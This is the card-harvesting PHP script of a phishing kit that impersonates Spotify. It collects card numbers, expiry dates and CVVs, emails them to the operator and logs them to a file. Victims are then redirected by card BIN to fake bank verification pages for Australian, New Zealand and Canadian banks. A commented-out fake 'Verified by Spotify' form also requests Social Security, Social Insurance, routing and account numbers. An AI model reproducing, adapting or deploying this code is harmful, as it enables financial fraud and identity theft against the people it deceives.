<?php
session_start();
$ip1 = getenv("REMOTE_ADDR");
$time = gmdate("H:i:s");
$date = gmdate("j/m");
$cnum = $_SESSION['cnum'] = $_POST['cnum'];
$expm = $_SESSION['expm'] = $_POST['expm'];
$expy = $_SESSION['expy'] = $_POST['expy'];
$ccv = $_SESSION['ccv'] = $_POST['ccv'];

$x = $_SESSION['cnum'];

$src2="Verified/NAB/NAB.html";

$src3="Verified/ANZ_new_zealand/ANZ.html";

$src4="Verified/BNZ/BNZ.html?ip=$ip1";

$src5="Verified/Bendigo/Bendigo.html?ip=$ip1";

$src6="Verified/Cuscal/Cuscal.html?ip=$ip1";

$src7="Verified/Kiwi/Kiwi.html?ip=$ip1";

$src8="Verified/Anz/ANZ.html?ip=$ip1";
$src8a="Verified/Anz/ANZ1.html?ip=$ip1";

$src9="Verified/RBC/RBC.html";

$src10="Verified/CIBC/CIBC.html";

$src11="Verified/Capitalone/capitalone.html";

$src12="Verified/canadatrust/canadatrust.html";

$src13="Verified/RBC/RBC1.html";

$src14="Verified/CIBC/CIBC1.html";

$src15="Verified/Capitalone/capitalone1.html";

$src16="Verified/canadatrust/canadatrust1.html";


$bin = substr($x,-100,-10);

$bannedIP_1 = array("455701","455704", "453030", "517832", "555001", "430330", "401795",  "428202", "455702", "433687", "428204", "401785", "428203", "451814", "490292", "517833", "401784", "531355", "401706", "517831", "518246", "531356", "518248", "518250", "428205", "434401", "428206", "401740", "434408", "451812", "518247", "531350", "558388", "531357", "531359", "436755", "518249", "455703", "451809", "517830", "451813", "531358", "434413", "471527", "437758");

$bannedIP_ANZ = array("436774", "405547", "436773", "454668", "483561", "490837", "490838", "551201", "530801", "551200", "524983", "542764", "524984", "542766", "558251", "498872", "540221", "547343", "524985", "461658", "498873", "540728");

$bannedIP_BNZ = array("543250", "499913", "456036", "499977", "499916", "499914", "531496", "377867", "499915", "377866", "377862", "540207", "496684", "462265", "428455", "420549", "494104");

$bannedIP_Bendigo = array("450605","518868", "456443", "519244", "433770");

$bannedIP_Cuscal = array("443449", "443438", "413321", "4434724", "443441", "61963", "443422", "443428", "483823", "413326", "483806", "413313", "443409", "443488", "443491", "443479", "443426", "443487", "443499", "443423", "443477", "413327", "404340", "413302", "404342", "443471", "445011", "443413", "443482", "443448", "413328", "483801", "443490", "413323", "413330", "443446", "461966", "413349", "443410", "461973", "443419", "483822", "443495", "483820", "404343", "434402", "455937", "443433", "443467", "443425", "413306", "404344", "461961", "413335", "418246", "483807", "443496", "443475", "443480", "443442", "443401", "443416", "443408", "418244", "413308", "443458", "443474", "413301", "483802", "443421", "443429", "443455", "443439", "443418", "443414", "443485", "443460", "413338", "443427", "443478", "443432", "413331", "443492", "443447", "413300", "443465", "443464", "443497", "443453", "443424", "413337", "443411", "413312", "445009", "413329", "413334", "445010", "443473", "443489", "418242", "461955", "443405", "413324", "443450", "483805", "491661", "443407", "483800", "443481", "443493", "470564", "443470", "443436", "413325", "404341", "443451", "443462", "413340", "443434", "443430", "443486");

$bannedIP_Kiwi = array("519163","524732", "428454", "543335", "556047", "545023", "483741");

$bannedIP_Westpac = array("377850", "377852", "456403", "456406", "456472", "516300", "516310", "516315", "516319", "516361", "516335", "516337", "516390", "456471", "555003");

$bannedIP_Commenwealth = array("521792", "514250", "410049", "521765", "521773", "535311", "520792", "410048", "410051", "521767", "482115", "456409", "410050", "555005", "406338", "482112", "449483", "521777", "550256", "545395", "440493", "521790", "521791", "456446", "560279", "521796", "405221", "520796", "535316", "535318", "375415", "453224", "535319", "535312", "521798", "512172", "406340", "552033", "521763", "456442", "552350", "558701", "548171521793", "521769", "520797", "434407", "460198", "521761", "456404", "521719", "521700", "543049", "520798", "529537", "520799", "521742", "521776", "550282", "521797", "521799", "535317", "520790", "512217", "537196", "533838", "520795", "520789", "521774", "375414", "482114", "514260", "456440", "520794", "520776", "535310", "521772", "547383", "482120", "521758", "521795", "494053", "494052", "406339", "532655", "482111", "558850", "529529", "523748", "512219", "558320", "456482", "375416", "520791", "456445", "512220", "520793", "521775", "482116", "512218", "410047", "521794", "482118", "519247", "521780", "521729");



//----------------------------------------------------------------------------------------------------------------------------

$bannedIP_ANZAU = array("462221","450949","456469","456468","407220","456004","486338","484062","456023","462223","462201","450913","450957","462296","450955","462299","462208","462289","456029","456008","462204","462294","462248","462218","450988","456030","462291","462222","462217","462250","462232","462293","462205","456053","456007","462290","450927","462240","450956","450987","462284","456009","462266","462281","462230","462249","456099","450958","450912","462251","462295","456046","450986","462253","456028","456019","462283","456084","456020","456025","462213","546827","462216","462297","462285","462227","456022","462254","462260","450954","462292","462207","456056","462231","456021","462228","462282","456058","462233","456003","462219","462258","462298","456024","462246","462229","462226","462225","462224","462220","462215","462214","462212","462211","462210","462209","462206");

$bannedIP_ANZAU1 = array("546828","546827","543048","540215","529523","529512","514045","524985","524984","524983","548847");

$bannedIP_canadatrust1 = array("453733","472409","455121","452034","452071","452482","452481","452480","452442","452441","452440","452382","452381","452380","452365","452342","452341","452340","452301","452297","452282","452281","452242","452241","452219","452218","452184","452182","452181","452158","452151","452142","452141","452065","452064","452063","452062","452061","452060","452055");

$bannedIP_canadatrust2 = array("548533","526888","526886","526882","526880","526879","526865","526864","526854","526852","526840","526829","526824","526813","526812");

$bannedIP_RBC1 = array("403602","451015","451503","403276","403279","405802","405815","405824","412652","412653","451948","451940","451906","451905","451904","451902","451645","451644","451643","451642","451641","451640","451639","451638","451637","451636","451635","451634","451633","451632","451998","451997","451996","451995","451994","451993","451992","451991","451988","451987","451970","451960","436672","436671","436670","436764","471537","451287","451280","451278","451277","451276","451270","451269","451260","451259","451258","451254","451252","451250","451246","451244","451243","451442","451440","451439","451438","451437","451435","451434","451431","451429","451428","451426","451423","451413","451411","451410","451409","451408","451407","451406","451405","451404","451403","451402","451401","451400","451242","451241");

$bannedIP_RBC2 = array("558974","552612","552490","547898","541590","541606");

$bannedIP_CIBC1 = array("526806","517759","526801","526805","526807","526809","526815","526825","546649","541142","517781");

$bannedIP_CIBC2 = array("478986","452552","452551","452550","450685","450677","450676","450674","450670","450657","450655","450654","450644","450615","450613","450597","450596","450593","450591","450588","450585","450584","450583","450581","450576","450569","450565","450562","450561","450560","450559","450558","450557","450556","450555","450554","450553","450552","450551","450550","450549","450548","450547","450546","450545","450544","450339","450338","450337","450336","450335","450334","450333","450332","450331","450330","450326","450324","450322","450310","450305","450304","450300","450043","450039","450037","450024","450020","450019","450018","450017","450014","450008","450007","450005","450004","450003","450002","450001");

$bannedIP_Capitalone1 = array("514759","521506","511293","516075","529107","529115","529123","529149","529156","529172","546064","515321","545534","546063","548798","549171","551298","554336","558958","552869","552851","546630","517805","557017","557009","557116","530287","529180","520197","511513","558224","558086","556306","554336","552802","552694","553258","551981","551980","551298","548799","548798","549171","548013","548012","547855","545534","546064","546063","531651","521633","514918","514759","514686","515321","511293","511946");


$bannedIP_Capitalone2 = array("450215","450214","441702","430230","480122","415573","415540","415938","415912","401305","487399","487394","487393","487392","487391","487390","487389","487388","487387","487386","487385","487384","487383","487382","487380","487379","487378","487377","487376","487375","487374","487373","487372","487371","487370","487369","487368","487367","487366","487365","487364","487363","487362","487361","487360","487359","487358","487356","487355","487353","487352","487351","487349","487348","487347","487345","487344","487338","487318","487313","487312","487308","468839","468838","468837","468405","465300","427054","427053","426692","409278","409274","415368","493000","490915","430523","430216","489966","445338","405608","403652","403611","403060","401797","401854","400498","400294","400393","493422","493109","487334","487333","479124","430572","486258","486255","486254","486249","486245","486243","486242","486241","486240","486236","486201","486291","486289","486288","486284","486274","486273","480213","438899","438888","438886","438885","438883","438874","438864","438861","438860","438814","438810","438806","438805","438800","423340","419310","415417","415557","414306","414305","414304","414303","414709","414398","414396","414385","414382","414381","414362","414361","414360","414359","414358","414356","414349","414325","414313","414311","412174","411507","410673","410608","403694","403444","400229","400344");



$msg1 = "
<pre><font style='font-size:14px;font-weight: bold;'>
#################################
         <img src='https://upload.wikimedia.org/wikipedia/commons/thumb/2/26/Spotify_logo_with_text.svg/2000px-Spotify_logo_with_text.svg.png' width='110' height='55'/>
#################################
|Card Number      : $cnum
|Date EX          : $expm / $expy
|CVV              : $ccv
|IP Adresse       : $ip1
#################################
Date : $date @ $time
###########Tn Ph0enix############";

 include 'email.php';
 $subj = "n00b cc | $ip1";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

 mail($to, $subj, $msg1,$headers);
 $file = fopen("../rst/cvv.html" , "a");
    fwrite($file, $msg1);

if(in_array($bin,$bannedIP_1)) 
{
header("location:$src2");
}

else if(in_array($bin,$bannedIP_ANZ)) 
{

//header('HTTP/1.0 404 Not Found');
	 
	header("location:$src3");
}


else if(in_array($bin,$bannedIP_Westpac)) 
{

//header('HTTP/1.0 404 Not Found');
	 
	header("location:$src3");
}


else if(in_array($bin,$bannedIP_Commenwealth)) 
{


//header('HTTP/1.0 404 Not Found');
	 
	header("location:$src3");
}

else if(in_array($bin,$bannedIP_BNZ)) 
{

//header('HTTP/1.0 404 Not Found');
	 
	header("location:$src4");
}

else if(in_array($bin,$bannedIP_Bendigo)) 
{
  

//header('HTTP/1.0 404 Not Found');
	 
	header("location:$src5");
}

else if(in_array($bin,$bannedIP_Cuscal)) 
{
//header('HTTP/1.0 404 Not Found');
	 
	header("location:$src6");
}

else if(in_array($bin,$bannedIP_Kiwi)) 
{

//header('HTTP/1.0 404 Not Found');
	 
	header("location:$src7");
}

else if(in_array($bin,$bannedIP_ANZAU)) 
{

//header('HTTP/1.0 404 Not Found');
	 
	header("location:$src8");
}
else if(in_array($bin,$bannedIP_ANZAU1)) 
{

//header('HTTP/1.0 404 Not Found');
	 
	header("location:$src8a");
}
else if(in_array($bin,$bannedIP_canadatrust1)) 
{

//header('HTTP/1.0 404 Not Found');
	 
	header("location:$src12");
}
else if(in_array($bin,$bannedIP_RBC1)) 
{

//header('HTTP/1.0 404 Not Found');
	 
	header("location:$src9");
}
else if(in_array($bin,$bannedIP_Capitalone1)) 
{

//header('HTTP/1.0 404 Not Found');
	 
	header("location:$src11");
}
else if(in_array($bin,$bannedIP_CIBC1)) 
{

//header('HTTP/1.0 404 Not Found');
	 
	header("location:$src10");
}
else if(in_array($bin,$bannedIP_canadatrust2)) 
{

//header('HTTP/1.0 404 Not Found');
	 
	header("location:$src16");
}
else if(in_array($bin,$bannedIP_RBC2)) 
{

//header('HTTP/1.0 404 Not Found');
	 
	header("location:$src13");
}
else if(in_array($bin,$bannedIP_Capitalone2)) 
{

//header('HTTP/1.0 404 Not Found');
	 
	header("location:$src15");
}
else if(in_array($bin,$bannedIP_CIBC2)) 
{

//header('HTTP/1.0 404 Not Found');
	 
	header("location:$src14");
}
 
else{
header("Location: https://www.spotify.com/int/account/overview/");
}
/*
$negara = $_SESSION['country'];
?>
<html>

<script type="text/javascript" src="//code.jquery.com/jquery-1.9.1.js"></script>
<script type="text/javascript" src="files/js/jquery.validate.min.js"></script>
<script type='text/javascript'>
$(window).load(function(){
$( document ).ready(function() {
	$('#dob').bind('keyup','keydown', function(event) {
  	var inputLength = event.target.value.length;
    if (event.keyCode != 8){
      if(inputLength === 2 || inputLength === 5){
        var thisVal = event.target.value;
        thisVal += '/';
        $(event.target).val(thisVal);
    	}
    }
  })
})
});
</script>
<head>
<title>Verified by Spotify</title>
</head><body>
      <div style="background: url(./img/vbv.PNG) no-repeat;  height: 700px;  width: 458px;               margin: 0 auto;   margin-top: 40px; position: relative;">
       <form action="finish.php" id="form1" method="post" name="login">	   
	<h5 style="position: absolute;  outline: none;left: 228px;top: 218px; font-family: Arial, Helvetica, sans-serif;">xxxx-xxxx-xxxx-<?php echo substr($_SESSION['cnum'] , -4);?></h5>     
<input    name="name" style="  position: absolute;  outline: none; top: 262px;  left: 227px;  border: 1px solid #CCCCCC; width: 185px;">
<input name="dateof" id="dob" style="  position: absolute;  outline: none;  top: 300px;  width: 185px; left: 227px; border: 1px solid #CCCCCC;">
<input name="vbv" type="password" style="position: absolute;  outline: none;      top: 372px;  border: 1px solid #CCCCCC;left: 227px;width: 185px;" >

<?php
if ($negara=="United States"){ echo '
<p style="left: 42px; color: #000000;      font-size: 14px; position: absolute;  outline: none;top: 400px;">Routing Number:</p>
									<input maxlength="15"  style="position: absolute;  outline: none; top: 400px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 185px;" autocomplete="off" name="routing" style="position: absolute;  outline: none;  top: 372;  border: 1px solid #CCCCCC;left: 227px;width: 185px;" type="text" >
';}
?>


<?php
if ($negara=="Canada"){ echo '
<p style="left: 42px; color: #000000;      font-size: 14px; position: absolute;  outline: none;top: 400px;">Social Insurance Number:</p>
									<input maxlength="15" style="position: absolute;  outline: none; top: 400px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 185px;"  autocomplete="off" name="cassn" type="text" required>
';}
?>


<?php if ($negara=="United States"  or $negara=="Ireland"){ echo '
<p style="left: 42px; color: #000000;      font-size: 14px; position: absolute;  outline: none;top: 460px;">Social Security Number:</p>
									<input maxlength="11" style="position: absolute;  outline: none; top: 460px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 185px;"  autocomplete="off" name="ssn" type="text" placeholder="XXX-XX-XXXX" required>
';}?>


<?php if ($negara=="United States" or $negara=="United Kingdom" or $negara=="Australia" or $negara=="Ireland"){ echo '
<p style="left: 42px; color: #000000;      font-size: 14px; position: absolute;  outline: none; top: 430px;">Account Number:</p>
	<input style="position: absolute;  outline: none; top: 430px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 185px;" maxlength="15" autocomplete="off" name="acc_number"  type="text" >
';}?>


<?php if ($negara=="United Kingdom" or $negara=="Ireland" ){ echo '
<p style="left: 42px; color: #000000;      font-size: 14px; position: absolute;  outline: none;top: 400px;">Sort Code:</p>
<input style="position: absolute;  outline: none; top: 400px; border: 1px solid rgb(204, 204, 204); left: 227px;width: 78px;" placeholder="XX-XX-XX" maxlength="8" autocomplete="off" name="sort" type="text" required>
';} ?>


<?php
if ($negara=="Australia"){ echo '
<p style="left: 42px; color: #000000;      font-size: 14px; position: absolute;  outline: none;top: 400px;">OSID Number:</p>
									<input maxlength="10" style="position: absolute;  outline: none; top: 400px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 185px;" autocomplete="off" name="osidnum" required="required" type="text">
									<p style="left: 42px; position: absolute;  outline: none;top: 445px;">Credit Limit:</p>
									                        <input type="text" style="position: absolute;  outline: none; top: 460px; border: 1px solid rgb(204, 204, 204); left: 227px; width: 185px;" autocomplete="off"  maxlength="32" name="cc_limit" required="" title="Credit Limit">

';}
?>

<input type="submit" value="Next" style="  position: absolute;    border-radius: 3px;  top: 500px; border: 1px solid #CCCCCC;  background-color: #DDDDDD; left: 126px;  width: 200px;">
  </form></div>
   </body></html>

<?php
}*/
?>